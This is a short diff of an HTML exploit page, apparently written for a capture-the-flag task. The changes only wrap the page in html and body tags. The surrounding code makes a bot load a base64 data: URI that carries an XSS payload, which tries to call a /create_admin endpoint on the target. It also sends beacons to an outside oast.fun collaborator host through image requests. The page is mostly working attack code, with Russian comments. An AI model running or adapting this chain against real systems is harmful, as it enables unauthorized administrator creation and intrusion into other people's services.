@@ -1,4 +1,6 @@
 <!DOCTYPE html>
+<html>
+<body>
 <script>
 const TARGET = 'https://tasks.goidactf.ru:20499';
 const COLLAB = 'https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun';
@@ -6,6 +8,8 @@ const COLLAB = 'https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun';
 // Отправляем бота на data: URI с XSS
 const xssPayload = `
 <!DOCTYPE html>
+<html>
+<body>
 <script>
 // Этот код выполнится в контексте data: URI (origin null)
 // Пробуем сделать запрос к create_admin
@@ -28,7 +32,9 @@ fetch('${TARGET}/create_admin', {
 
 // Отправляем сигнал
 new Image().src = '${COLLAB}/?from_data_uri=executed';
-<\/script>`;
+<\/script>
+</body>
+</html>`;
 
 // Кодируем в base64 для data: URI
 const base64Payload = btoa(xssPayload);
@@ -43,3 +49,5 @@ fetch(TARGET + '/get_url', {
     new Image().src = COLLAB + '/?ssrf_sent=yes';
 });
 </script>
+</body>
+</html>
